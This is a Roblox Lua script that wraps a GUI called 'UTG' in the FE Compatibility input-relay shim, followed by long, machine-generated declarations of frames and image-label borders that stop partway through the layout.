--https://github.com/Mokiros/roblox-FE-compatibility
if game:GetService("RunService"):IsClient() then error("Script must be server-side in order to work; use h/ and not hl/") end
local Player,game,owner = owner,game
local RealPlayer = Player
do
	print("FE Compatibility code V2 by Mokiros")
	local RealPlayer = RealPlayer
	script.Parent = RealPlayer.Character

	--Fake event to make stuff like Mouse.KeyDown work
	local Disconnect_Function = function(this)
		this[1].Functions[this[2]] = nil
	end
	local Disconnect_Metatable = {__index={disconnect=Disconnect_Function,Disconnect=Disconnect_Function}}
	local FakeEvent_Metatable = {__index={
		Connect = function(this,f)
			local i = tostring(math.random(0,10000))
			while this.Functions[i] do
				i = tostring(math.random(0,10000))
			end
			this.Functions[i] = f
			return setmetatable({this,i},Disconnect_Metatable)
		end
	}}
	FakeEvent_Metatable.__index.connect = FakeEvent_Metatable.__index.Connect
	local function fakeEvent()
		return setmetatable({Functions={}},FakeEvent_Metatable)
	end

	--Creating fake input objects with fake variables
	local FakeMouse = {Hit=CFrame.new(),KeyUp=fakeEvent(),KeyDown=fakeEvent(),Button1Up=fakeEvent(),Button1Down=fakeEvent(),Button2Up=fakeEvent(),Button2Down=fakeEvent()}
	FakeMouse.keyUp = FakeMouse.KeyUp
	FakeMouse.keyDown = FakeMouse.KeyDown
	local UIS = {InputBegan=fakeEvent(),InputEnded=fakeEvent()}
	local CAS = {Actions={},BindAction=function(self,name,fun,touch,...)
		CAS.Actions[name] = fun and {Name=name,Function=fun,Keys={...}} or nil
	end}
	--Merged 2 functions into one by checking amount of arguments
	CAS.UnbindAction = CAS.BindAction

	--This function will trigger the events that have been :Connect()'ed
	local function TriggerEvent(self,ev,...)
		for _,f in pairs(self[ev].Functions) do
			f(...)
		end
	end
	FakeMouse.TriggerEvent = TriggerEvent
	UIS.TriggerEvent = TriggerEvent

	--Client communication
	local Event = Instance.new("RemoteEvent")
	Event.Name = "UserInput_Event"
	Event.OnServerEvent:Connect(function(plr,io)
		if plr~=RealPlayer then return end
		FakeMouse.Target = io.Target
		FakeMouse.Hit = io.Hit
		if not io.isMouse then
			local b = io.UserInputState == Enum.UserInputState.Begin
			if io.UserInputType == Enum.UserInputType.MouseButton1 then
				return FakeMouse:TriggerEvent(b and "Button1Down" or "Button1Up")
			end
			if io.UserInputType == Enum.UserInputType.MouseButton2 then
				return FakeMouse:TriggerEvent(b and "Button2Down" or "Button2Up")
			end
			for _,t in pairs(CAS.Actions) do
				for _,k in pairs(t.Keys) do
					if k==io.KeyCode then
						t.Function(t.Name,io.UserInputState,io)
					end
				end
			end
			FakeMouse:TriggerEvent(b and "KeyDown" or "KeyUp",io.KeyCode.Name:lower())
			UIS:TriggerEvent(b and "InputBegan" or "InputEnded",io,false)
		end
	end)
	Event.Parent = NLS([==[local Event = script:WaitForChild("UserInput_Event")
	local Mouse = owner:GetMouse()
	local UIS = game:GetService("UserInputService")
	local input = function(io,RobloxHandled)
		if RobloxHandled then return end
		--Since InputObject is a client-side instance, we create and pass table instead
		Event:FireServer({KeyCode=io.KeyCode,UserInputType=io.UserInputType,UserInputState=io.UserInputState,Hit=Mouse.Hit,Target=Mouse.Target})
	end
	UIS.InputBegan:Connect(input)
	UIS.InputEnded:Connect(input)
	local h,t
	--Give the server mouse data every second frame, but only if the values changed
	--If player is not moving their mouse, client won't fire events
	local HB = game:GetService("RunService").Heartbeat
	while true do
		if h~=Mouse.Hit or t~=Mouse.Target then
			h,t=Mouse.Hit,Mouse.Target
			Event:FireServer({isMouse=true,Target=t,Hit=h})
		end
		--Wait 2 frames
		for i=1,2 do
			HB:Wait()
		end
	end]==],script)

	----Sandboxed game object that allows the usage of client-side methods and services
	--Real game object
	local RealGame = game

	--Metatable for fake service
	local FakeService_Metatable = {
		__index = function(self,k)
			local s = rawget(self,"_RealService")
			if s then
				return typeof(s[k])=="function"
					and function(_,...)return s[k](s,...)end or s[k]
			end
		end,
		__newindex = function(self,k,v)
			local s = rawget(self,"_RealService")
			if s then s[k]=v end
		end
	}
	local function FakeService(t,RealService)
		t._RealService = typeof(RealService)=="string" and RealGame:GetService(RealService) or RealService
		return setmetatable(t,FakeService_Metatable)
	end

	--Fake game object
	local FakeGame = {
		GetService = function(self,s)
			return rawget(self,s) or RealGame:GetService(s)
		end,
		Players = FakeService({
			LocalPlayer = FakeService({GetMouse=function(self)return FakeMouse end},Player)
		},"Players"),
		UserInputService = FakeService(UIS,"UserInputService"),
		ContextActionService = FakeService(CAS,"ContextActionService"),
		RunService = FakeService({
			_btrs = {},
			RenderStepped = RealGame:GetService("RunService").Heartbeat,
			BindToRenderStep = function(self,name,_,fun)
				self._btrs[name] = self.Heartbeat:Connect(fun)
			end,
			UnbindFromRenderStep = function(self,name)
				self._btrs[name]:Disconnect()
			end,
		},"RunService")
	}
	rawset(FakeGame.Players,"localPlayer",FakeGame.Players.LocalPlayer)
	FakeGame.service = FakeGame.GetService
	FakeService(FakeGame,game)
	--Changing owner to fake player object to support owner:GetMouse()
	game,owner = FakeGame,FakeGame.Players.LocalPlayer
end
--Converted with ttyyuu12345's model to script plugin v4
function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
Frame2 = Instance.new("Frame")
ImageLabel3 = Instance.new("ImageLabel")
ImageLabel4 = Instance.new("ImageLabel")
ImageLabel5 = Instance.new("ImageLabel")
ImageLabel6 = Instance.new("ImageLabel")
ImageLabel7 = Instance.new("ImageLabel")
ImageLabel8 = Instance.new("ImageLabel")
ImageLabel9 = Instance.new("ImageLabel")
ImageLabel10 = Instance.new("ImageLabel")
ImageLabel11 = Instance.new("ImageLabel")
ImageLabel12 = Instance.new("ImageLabel")
ImageLabel13 = Instance.new("ImageLabel")
ImageLabel14 = Instance.new("ImageLabel")
ImageLabel15 = Instance.new("ImageLabel")
ImageLabel16 = Instance.new("ImageLabel")
ImageLabel17 = Instance.new("ImageLabel")
ImageLabel18 = Instance.new("ImageLabel")
ImageLabel19 = Instance.new("ImageLabel")
ImageLabel20 = Instance.new("ImageLabel")
ImageLabel21 = Instance.new("ImageLabel")
ImageLabel22 = Instance.new("ImageLabel")
ImageLabel23 = Instance.new("ImageLabel")
ImageLabel24 = Instance.new("ImageLabel")
ImageLabel25 = Instance.new("ImageLabel")
Script26 = Instance.new("Script")
ImageLabel27 = Instance.new("ImageLabel")
ImageLabel28 = Instance.new("ImageLabel")
ImageLabel29 = Instance.new("ImageLabel")
ImageLabel30 = Instance.new("ImageLabel")
ImageLabel31 = Instance.new("ImageLabel")
ImageLabel32 = Instance.new("ImageLabel")
ImageLabel33 = Instance.new("ImageLabel")
ImageLabel34 = Instance.new("ImageLabel")
ImageLabel35 = Instance.new("ImageLabel")
ImageLabel36 = Instance.new("ImageLabel")
ImageLabel37 = Instance.new("ImageLabel")
ImageLabel38 = Instance.new("ImageLabel")
ImageLabel39 = Instance.new("ImageLabel")
ImageLabel40 = Instance.new("ImageLabel")
ImageLabel41 = Instance.new("ImageLabel")
ImageLabel42 = Instance.new("ImageLabel")
ImageLabel43 = Instance.new("ImageLabel")
ImageLabel44 = Instance.new("ImageLabel")
ImageLabel45 = Instance.new("ImageLabel")
ImageLabel46 = Instance.new("ImageLabel")
ImageLabel47 = Instance.new("ImageLabel")
ImageLabel48 = Instance.new("ImageLabel")
ImageLabel49 = Instance.new("ImageLabel")
ImageLabel50 = Instance.new("ImageLabel")
ImageLabel51 = Instance.new("ImageLabel")
ImageLabel52 = Instance.new("ImageLabel")
ImageLabel53 = Instance.new("ImageLabel")
ImageLabel54 = Instance.new("ImageLabel")
ImageLabel55 = Instance.new("ImageLabel")
ImageLabel56 = Instance.new("ImageLabel")
ImageLabel57 = Instance.new("ImageLabel")
ImageLabel58 = Instance.new("ImageLabel")
ImageLabel59 = Instance.new("ImageLabel")
ImageLabel60 = Instance.new("ImageLabel")
ImageLabel61 = Instance.new("ImageLabel")
ImageLabel62 = Instance.new("ImageLabel")
ImageLabel63 = Instance.new("ImageLabel")
ImageLabel64 = Instance.new("ImageLabel")
ImageLabel65 = Instance.new("ImageLabel")
ImageLabel66 = Instance.new("ImageLabel")
ImageLabel67 = Instance.new("ImageLabel")
ImageLabel68 = Instance.new("ImageLabel")
ImageLabel69 = Instance.new("ImageLabel")
ImageLabel70 = Instance.new("ImageLabel")
ImageLabel71 = Instance.new("ImageLabel")
ImageLabel72 = Instance.new("ImageLabel")
ImageLabel73 = Instance.new("ImageLabel")
ImageLabel74 = Instance.new("ImageLabel")
ImageLabel75 = Instance.new("ImageLabel")
ImageLabel76 = Instance.new("ImageLabel")
ImageLabel77 = Instance.new("ImageLabel")
ImageLabel78 = Instance.new("ImageLabel")
ImageLabel79 = Instance.new("ImageLabel")
ImageLabel80 = Instance.new("ImageLabel")
ImageLabel81 = Instance.new("ImageLabel")
ImageLabel82 = Instance.new("ImageLabel")
ImageLabel83 = Instance.new("ImageLabel")
Frame84 = Instance.new("Frame")
TextBox85 = Instance.new("TextBox")
LocalScript86 = Instance.new("LocalScript")
RemoteEvent87 = Instance.new("RemoteEvent")
Script88 = Instance.new("Script")
StringValue89 = Instance.new("StringValue")
Script90 = Instance.new("Script")
ImageLabel91 = Instance.new("ImageLabel")
Script92 = Instance.new("Script")
LocalScript93 = Instance.new("LocalScript")
TextLabel94 = Instance.new("TextLabel")
ImageLabel95 = Instance.new("ImageLabel")
ImageLabel96 = Instance.new("ImageLabel")
TextLabel97 = Instance.new("TextLabel")
TextLabel98 = Instance.new("TextLabel")
ImageLabel99 = Instance.new("ImageLabel")
ScrollingFrame100 = Instance.new("ScrollingFrame")
TextButton101 = Instance.new("TextButton")
Script102 = Instance.new("Script")
ImageLabel103 = Instance.new("ImageLabel")
TextButton104 = Instance.new("TextButton")
Script105 = Instance.new("Script")
ImageLabel106 = Instance.new("ImageLabel")
TextButton107 = Instance.new("TextButton")
Script108 = Instance.new("Script")
ImageLabel109 = Instance.new("ImageLabel")
TextButton110 = Instance.new("TextButton")
Script111 = Instance.new("Script")
ImageLabel112 = Instance.new("ImageLabel")
TextButton113 = Instance.new("TextButton")
Script114 = Instance.new("Script")
ImageLabel115 = Instance.new("ImageLabel")
TextButton116 = Instance.new("TextButton")
Script117 = Instance.new("Script")
ImageLabel118 = Instance.new("ImageLabel")
TextButton119 = Instance.new("TextButton")
Script120 = Instance.new("Script")
ImageLabel121 = Instance.new("ImageLabel")
TextButton122 = Instance.new("TextButton")
Script123 = Instance.new("Script")
ImageLabel124 = Instance.new("ImageLabel")
TextButton125 = Instance.new("TextButton")
Script126 = Instance.new("Script")
ImageLabel127 = Instance.new("ImageLabel")
TextButton128 = Instance.new("TextButton")
Script129 = Instance.new("Script")
ImageLabel130 = Instance.new("ImageLabel")
TextButton131 = Instance.new("TextButton")
Script132 = Instance.new("Script")
ImageLabel133 = Instance.new("ImageLabel")
TextButton134 = Instance.new("TextButton")
Script135 = Instance.new("Script")
ImageLabel136 = Instance.new("ImageLabel")
TextButton137 = Instance.new("TextButton")
Script138 = Instance.new("Script")
ImageLabel139 = Instance.new("ImageLabel")
TextButton140 = Instance.new("TextButton")
Script141 = Instance.new("Script")
ImageLabel142 = Instance.new("ImageLabel")
TextButton143 = Instance.new("TextButton")
Script144 = Instance.new("Script")
ImageLabel145 = Instance.new("ImageLabel")
TextButton146 = Instance.new("TextButton")
Script147 = Instance.new("Script")
ImageLabel148 = Instance.new("ImageLabel")
TextButton149 = Instance.new("TextButton")
Script150 = Instance.new("Script")
ImageLabel151 = Instance.new("ImageLabel")
TextButton152 = Instance.new("TextButton")
Script153 = Instance.new("Script")
ImageLabel154 = Instance.new("ImageLabel")
TextButton155 = Instance.new("TextButton")
Script156 = Instance.new("Script")
ImageLabel157 = Instance.new("ImageLabel")
TextButton158 = Instance.new("TextButton")
Script159 = Instance.new("Script")
ImageLabel160 = Instance.new("ImageLabel")
TextButton161 = Instance.new("TextButton")
Script162 = Instance.new("Script")
ImageLabel163 = Instance.new("ImageLabel")
TextButton164 = Instance.new("TextButton")
Script165 = Instance.new("Script")
ImageLabel166 = Instance.new("ImageLabel")
TextButton167 = Instance.new("TextButton")
Script168 = Instance.new("Script")
ImageLabel169 = Instance.new("ImageLabel")
TextButton170 = Instance.new("TextButton")
Script171 = Instance.new("Script")
ImageLabel172 = Instance.new("ImageLabel")
TextButton173 = Instance.new("TextButton")
Script174 = Instance.new("Script")
ImageLabel175 = Instance.new("ImageLabel")
TextButton176 = Instance.new("TextButton")
Script177 = Instance.new("Script")
ImageLabel178 = Instance.new("ImageLabel")
TextButton179 = Instance.new("TextButton")
Script180 = Instance.new("Script")
ImageLabel181 = Instance.new("ImageLabel")
TextButton182 = Instance.new("TextButton")
Script183 = Instance.new("Script")
ImageLabel184 = Instance.new("ImageLabel")
TextButton185 = Instance.new("TextButton")
Script186 = Instance.new("Script")
ImageLabel187 = Instance.new("ImageLabel")
TextButton188 = Instance.new("TextButton")
Script189 = Instance.new("Script")
ImageLabel190 = Instance.new("ImageLabel")
TextButton191 = Instance.new("TextButton")
Script192 = Instance.new("Script")
ImageLabel193 = Instance.new("ImageLabel")
TextButton194 = Instance.new("TextButton")
Script195 = Instance.new("Script")
ImageLabel196 = Instance.new("ImageLabel")
TextButton197 = Instance.new("TextButton")
Script198 = Instance.new("Script")
ImageLabel199 = Instance.new("ImageLabel")
TextButton200 = Instance.new("TextButton")
Script201 = Instance.new("Script")
ImageLabel202 = Instance.new("ImageLabel")
TextButton203 = Instance.new("TextButton")
Script204 = Instance.new("Script")
ImageLabel205 = Instance.new("ImageLabel")
TextButton206 = Instance.new("TextButton")
Script207 = Instance.new("Script")
ImageLabel208 = Instance.new("ImageLabel")
TextButton209 = Instance.new("TextButton")
Script210 = Instance.new("Script")
ImageLabel211 = Instance.new("ImageLabel")
TextButton212 = Instance.new("TextButton")
Script213 = Instance.new("Script")
ImageLabel214 = Instance.new("ImageLabel")
TextButton215 = Instance.new("TextButton")
Script216 = Instance.new("Script")
ImageLabel217 = Instance.new("ImageLabel")
TextButton218 = Instance.new("TextButton")
Script219 = Instance.new("Script")
ImageLabel220 = Instance.new("ImageLabel")
TextButton221 = Instance.new("TextButton")
Script222 = Instance.new("Script")
ImageLabel223 = Instance.new("ImageLabel")
TextButton224 = Instance.new("TextButton")
Script225 = Instance.new("Script")
ImageLabel226 = Instance.new("ImageLabel")
TextButton227 = Instance.new("TextButton")
Script228 = Instance.new("Script")
ImageLabel229 = Instance.new("ImageLabel")
TextButton230 = Instance.new("TextButton")
Script231 = Instance.new("Script")
ImageLabel232 = Instance.new("ImageLabel")
TextButton233 = Instance.new("TextButton")
Script234 = Instance.new("Script")
ImageLabel235 = Instance.new("ImageLabel")
TextButton236 = Instance.new("TextButton")
Script237 = Instance.new("Script")
ImageLabel238 = Instance.new("ImageLabel")
TextButton239 = Instance.new("TextButton")
Script240 = Instance.new("Script")
ImageLabel241 = Instance.new("ImageLabel")
TextButton242 = Instance.new("TextButton")
Script243 = Instance.new("Script")
ImageLabel244 = Instance.new("ImageLabel")
TextButton245 = Instance.new("TextButton")
Script246 = Instance.new("Script")
ImageLabel247 = Instance.new("ImageLabel")
TextButton248 = Instance.new("TextButton")
Script249 = Instance.new("Script")
ImageLabel250 = Instance.new("ImageLabel")
TextButton251 = Instance.new("TextButton")
Script252 = Instance.new("Script")
ImageLabel253 = Instance.new("ImageLabel")
TextButton254 = Instance.new("TextButton")
Script255 = Instance.new("Script")
ImageLabel256 = Instance.new("ImageLabel")
TextButton257 = Instance.new("TextButton")
Script258 = Instance.new("Script")
ImageLabel259 = Instance.new("ImageLabel")
TextButton260 = Instance.new("TextButton")
Script261 = Instance.new("Script")
ImageLabel262 = Instance.new("ImageLabel")
TextButton263 = Instance.new("TextButton")
Script264 = Instance.new("Script")
ImageLabel265 = Instance.new("ImageLabel")
TextButton266 = Instance.new("TextButton")
Script267 = Instance.new("Script")
ImageLabel268 = Instance.new("ImageLabel")
TextButton269 = Instance.new("TextButton")
Script270 = Instance.new("Script")
ImageLabel271 = Instance.new("ImageLabel")
TextButton272 = Instance.new("TextButton")
Script273 = Instance.new("Script")
ImageLabel274 = Instance.new("ImageLabel")
TextButton275 = Instance.new("TextButton")
Script276 = Instance.new("Script")
ImageLabel277 = Instance.new("ImageLabel")
TextButton278 = Instance.new("TextButton")
Script279 = Instance.new("Script")
ImageLabel280 = Instance.new("ImageLabel")
TextButton281 = Instance.new("TextButton")
Script282 = Instance.new("Script")
ImageLabel283 = Instance.new("ImageLabel")
TextButton284 = Instance.new("TextButton")
Script285 = Instance.new("Script")
ImageLabel286 = Instance.new("ImageLabel")
TextButton287 = Instance.new("TextButton")
Script288 = Instance.new("Script")
ImageLabel289 = Instance.new("ImageLabel")
TextButton290 = Instance.new("TextButton")
Script291 = Instance.new("Script")
ImageLabel292 = Instance.new("ImageLabel")
TextButton293 = Instance.new("TextButton")
Script294 = Instance.new("Script")
ImageLabel295 = Instance.new("ImageLabel")
TextButton296 = Instance.new("TextButton")
Script297 = Instance.new("Script")
ImageLabel298 = Instance.new("ImageLabel")
TextButton299 = Instance.new("TextButton")
Script300 = Instance.new("Script")
ImageLabel301 = Instance.new("ImageLabel")
TextButton302 = Instance.new("TextButton")
Script303 = Instance.new("Script")
ImageLabel304 = Instance.new("ImageLabel")
TextButton305 = Instance.new("TextButton")
Script306 = Instance.new("Script")
ImageLabel307 = Instance.new("ImageLabel")
TextButton308 = Instance.new("TextButton")
Script309 = Instance.new("Script")
ImageLabel310 = Instance.new("ImageLabel")
TextButton311 = Instance.new("TextButton")
LocalScript312 = Instance.new("LocalScript")
Frame313 = Instance.new("Frame")
ImageLabel314 = Instance.new("ImageLabel")
ImageLabel315 = Instance.new("ImageLabel")
TextButton316 = Instance.new("TextButton")
LocalScript317 = Instance.new("LocalScript")
Script318 = Instance.new("Script")
RemoteEvent319 = Instance.new("RemoteEvent")
ModuleScript320 = Instance.new("ModuleScript")
ScreenGui0.Name = "UTG"
ScreenGui0.Parent = mas
ScreenGui0.ResetOnSpawn = false
Frame1.Name = "Main"
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.358615786, 174, 0.000964039355, 87)
Frame1.Size = UDim2.new(0, 309, 0, 339)
Frame1.Active = true
Frame1.BackgroundColor = BrickColor.new("Really black")
Frame1.BackgroundColor3 = Color3.new(0, 0, 0)
Frame1.BackgroundTransparency = 1
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame1.Draggable = true
Frame1.Selectable = true
Frame1.ZIndex = 2
Frame2.Name = "Borders"
Frame2.Parent = Frame1
Frame2.Position = UDim2.new(0, 15, 0, 12)
Frame2.Size = UDim2.new(0.984007716, -24, 1.00244904, -24)
Frame2.BackgroundColor = BrickColor.new("Institutional white")
Frame2.BackgroundColor3 = Color3.new(1, 1, 1)
Frame2.BackgroundTransparency = 1
Frame2.BorderColor = BrickColor.new("Lime green")
Frame2.BorderColor3 = Color3.new(0.333333, 1, 0)
Frame2.BorderSizePixel = 0
ImageLabel3.Name = "Border"
ImageLabel3.Parent = Frame2
ImageLabel3.Position = UDim2.new(0, -12, 0, -12)
ImageLabel3.Size = UDim2.new(0, 12, 0, 12)
ImageLabel3.BackgroundColor = BrickColor.new("Institutional white")
ImageLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel3.BackgroundTransparency = 1
ImageLabel3.BorderSizePixel = 0
ImageLabel3.Image = "rbxassetid://238725003"
ImageLabel3.ImageColor3 = Color3.new(0.666667, 0.666667, 1)
ImageLabel3.ImageRectSize = Vector2.new(12, 12)
ImageLabel3.ImageTransparency = 1
ImageLabel4.Name = "NineBox_TopLeft"
ImageLabel4.Parent = ImageLabel3
ImageLabel4.Size = UDim2.new(0, 6, 0, 6)
ImageLabel4.BackgroundTransparency = 1
ImageLabel4.BorderSizePixel = 0
ImageLabel4.Image = "rbxassetid://238725003"
ImageLabel4.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel4.ImageRectSize = Vector2.new(6, 6)
ImageLabel5.Name = "NineBox_Top"
ImageLabel5.Parent = ImageLabel3
ImageLabel5.Position = UDim2.new(0, 6, 0, 0)
ImageLabel5.Size = UDim2.new(1, -12, 0, 6)
ImageLabel5.BackgroundTransparency = 1
ImageLabel5.BorderSizePixel = 0
ImageLabel5.Image = "rbxassetid://238725003"
ImageLabel5.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel5.ImageRectOffset = Vector2.new(6, 0)
ImageLabel5.ImageRectSize = Vector2.new(0, 6)
ImageLabel6.Name = "NineBox_TopRight"
ImageLabel6.Parent = ImageLabel3
ImageLabel6.Position = UDim2.new(1, -6, 0, 0)
ImageLabel6.Size = UDim2.new(0, 6, 0, 6)
ImageLabel6.BackgroundTransparency = 1
ImageLabel6.BorderSizePixel = 0
ImageLabel6.Image = "rbxassetid://238725003"
ImageLabel6.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel6.ImageRectOffset = Vector2.new(6, 0)
ImageLabel6.ImageRectSize = Vector2.new(6, 6)
ImageLabel7.Name = "NineBox_Left"
ImageLabel7.Parent = ImageLabel3
ImageLabel7.Position = UDim2.new(0, 0, 0, 6)
ImageLabel7.Size = UDim2.new(0, 6, 1, -12)
ImageLabel7.BackgroundTransparency = 1
ImageLabel7.BorderSizePixel = 0
ImageLabel7.Image = "rbxassetid://238725003"
ImageLabel7.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel7.ImageRectOffset = Vector2.new(0, 6)
ImageLabel7.ImageRectSize = Vector2.new(6, 0)
ImageLabel8.Name = "NineBox_Center"
ImageLabel8.Parent = ImageLabel3
ImageLabel8.Position = UDim2.new(0, 6, 0, 6)
ImageLabel8.Size = UDim2.new(1, -12, 1, -12)
ImageLabel8.BackgroundTransparency = 1
ImageLabel8.BorderSizePixel = 0
ImageLabel8.Image = "rbxassetid://238725003"
ImageLabel8.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel8.ImageRectOffset = Vector2.new(6, 6)
ImageLabel9.Name = "NineBox_Right"
ImageLabel9.Parent = ImageLabel3
ImageLabel9.Position = UDim2.new(1, -6, 0, 6)
ImageLabel9.Size = UDim2.new(0, 6, 1, -12)
ImageLabel9.BackgroundTransparency = 1
ImageLabel9.BorderSizePixel = 0
ImageLabel9.Image = "rbxassetid://238725003"
ImageLabel9.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel9.ImageRectOffset = Vector2.new(6, 6)
ImageLabel9.ImageRectSize = Vector2.new(6, 0)
ImageLabel10.Name = "NineBox_BottomLeft"
ImageLabel10.Parent = ImageLabel3
ImageLabel10.Position = UDim2.new(0, 0, 1, -6)
ImageLabel10.Size = UDim2.new(0, 6, 0, 6)
ImageLabel10.BackgroundTransparency = 1
ImageLabel10.BorderSizePixel = 0
ImageLabel10.Image = "rbxassetid://238725003"
ImageLabel10.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel10.ImageRectOffset = Vector2.new(0, 6)
ImageLabel10.ImageRectSize = Vector2.new(6, 6)
ImageLabel11.Name = "NineBox_Bottom"
ImageLabel11.Parent = ImageLabel3
ImageLabel11.Position = UDim2.new(0, 6, 1, -6)
ImageLabel11.Size = UDim2.new(1, -12, 0, 6)
ImageLabel11.BackgroundTransparency = 1
ImageLabel11.BorderSizePixel = 0
ImageLabel11.Image = "rbxassetid://238725003"
ImageLabel11.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel11.ImageRectOffset = Vector2.new(6, 6)
ImageLabel11.ImageRectSize = Vector2.new(0, 6)
ImageLabel12.Name = "NineBox_BottomRight"
ImageLabel12.Parent = ImageLabel3
ImageLabel12.Position = UDim2.new(1, -6, 1, -6)
ImageLabel12.Size = UDim2.new(0, 6, 0, 6)
ImageLabel12.BackgroundTransparency = 1
ImageLabel12.BorderSizePixel = 0
ImageLabel12.Image = "rbxassetid://238725003"
ImageLabel12.ImageColor3 = Color3.new(0.576471, 0, 0.886275)
ImageLabel12.ImageRectOffset = Vector2.new(6, 6)
ImageLabel12.ImageRectSize = Vector2.new(6, 6)
ImageLabel13.Name = "Border"
ImageLabel13.Parent = Frame2
ImageLabel13.Position = UDim2.new(1, 0, 0, -12)
ImageLabel13.Size = UDim2.new(0, 12, 0, 12)
ImageLabel13.BackgroundColor = BrickColor.new("Lime green")
ImageLabel13.BackgroundColor3 = Color3.new(0.333333, 1, 0)
ImageLabel13.BackgroundTransparency = 1
ImageLabel13.BorderColor = BrickColor.new("Lime green")
ImageLabel13.BorderColor3 = Color3.new(0.333333, 1, 0)
ImageLabel13.BorderSizePixel = 0
ImageLabel13.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel13.ImageColor3 = Color3.new(0.447059, 0.0392157, 0.701961)
ImageLabel13.ImageRectOffset = Vector2.new(24, 0)
ImageLabel13.ImageRectSize = Vector2.new(12, 12)
ImageLabel13.ImageTransparency = 1
ImageLabel14.Name = "NineBox_TopLeft"
ImageLabel14.Parent = ImageLabel13
ImageLabel14.Size = UDim2.new(0, 6, 0, 6)
ImageLabel14.BackgroundTransparency = 1
ImageLabel14.BorderSizePixel = 0
ImageLabel14.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel14.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel14.ImageRectOffset = Vector2.new(24, 0)
ImageLabel14.ImageRectSize = Vector2.new(6, 6)
ImageLabel15.Name = "NineBox_Top"
ImageLabel15.Parent = ImageLabel13
ImageLabel15.Position = UDim2.new(0, 6, 0, 0)
ImageLabel15.Size = UDim2.new(1, -12, 0, 6)
ImageLabel15.BackgroundTransparency = 1
ImageLabel15.BorderSizePixel = 0
ImageLabel15.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel15.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel15.ImageRectOffset = Vector2.new(30, 0)
ImageLabel15.ImageRectSize = Vector2.new(0, 6)
ImageLabel16.Name = "NineBox_TopRight"
ImageLabel16.Parent = ImageLabel13
ImageLabel16.Position = UDim2.new(1, -6, 0, 0)
ImageLabel16.Size = UDim2.new(0, 6, 0, 6)
ImageLabel16.BackgroundTransparency = 1
ImageLabel16.BorderSizePixel = 0
ImageLabel16.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel16.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel16.ImageRectOffset = Vector2.new(30, 0)
ImageLabel16.ImageRectSize = Vector2.new(6, 6)
ImageLabel17.Name = "NineBox_Left"
ImageLabel17.Parent = ImageLabel13
ImageLabel17.Position = UDim2.new(0, 0, 0, 6)
ImageLabel17.Size = UDim2.new(0, 6, 1, -12)
ImageLabel17.BackgroundTransparency = 1
ImageLabel17.BorderSizePixel = 0
ImageLabel17.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel17.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel17.ImageRectOffset = Vector2.new(24, 6)
ImageLabel17.ImageRectSize = Vector2.new(6, 0)
ImageLabel18.Name = "NineBox_Center"
ImageLabel18.Parent = ImageLabel13
ImageLabel18.Position = UDim2.new(0, 6, 0, 6)
ImageLabel18.Size = UDim2.new(1, -12, 1, -12)
ImageLabel18.BackgroundTransparency = 1
ImageLabel18.BorderSizePixel = 0
ImageLabel18.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel18.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel18.ImageRectOffset = Vector2.new(30, 6)
ImageLabel19.Name = "NineBox_Right"
ImageLabel19.Parent = ImageLabel13
ImageLabel19.Position = UDim2.new(1, -6, 0, 6)
ImageLabel19.Size = UDim2.new(0, 6, 1, -12)
ImageLabel19.BackgroundTransparency = 1
ImageLabel19.BorderSizePixel = 0
ImageLabel19.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel19.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel19.ImageRectOffset = Vector2.new(30, 6)
ImageLabel19.ImageRectSize = Vector2.new(6, 0)
ImageLabel20.Name = "NineBox_BottomLeft"
ImageLabel20.Parent = ImageLabel13
ImageLabel20.Position = UDim2.new(0, 0, 1, -6)
ImageLabel20.Size = UDim2.new(0, 6, 0, 6)
ImageLabel20.BackgroundTransparency = 1
ImageLabel20.BorderSizePixel = 0
ImageLabel20.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel20.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel20.ImageRectOffset = Vector2.new(24, 6)
ImageLabel20.ImageRectSize = Vector2.new(6, 6)
ImageLabel21.Name = "NineBox_Bottom"
ImageLabel21.Parent = ImageLabel13
ImageLabel21.Position = UDim2.new(0, 6, 1, -6)
ImageLabel21.Size = UDim2.new(1, -12, 0, 6)
ImageLabel21.BackgroundTransparency = 1
ImageLabel21.BorderSizePixel = 0
ImageLabel21.Image = "http://www.roblox.com/asset/?id=238725003"
ImageLabel21.ImageColor3 = Color3.new(0.592157, 0, 0.886275)
ImageLabel21.ImageRectOffset = Vector2.new(30, 6)
ImageLabel21.ImageRectSize = Vector2.new(0, 6)
ImageLabel22.Name = "NineBox_BottomRight"
ImageLabel22.Parent = ImageLabel13
ImageLabel22.Position = UDim2.new(1, -6, 1, -6)
ImageLabel22.Size = UDim2.new(0, 6, 0, 6)
ImageLabel22.BackgroundTransparency = 1
ImageLabel22.BorderSizePixel = 0
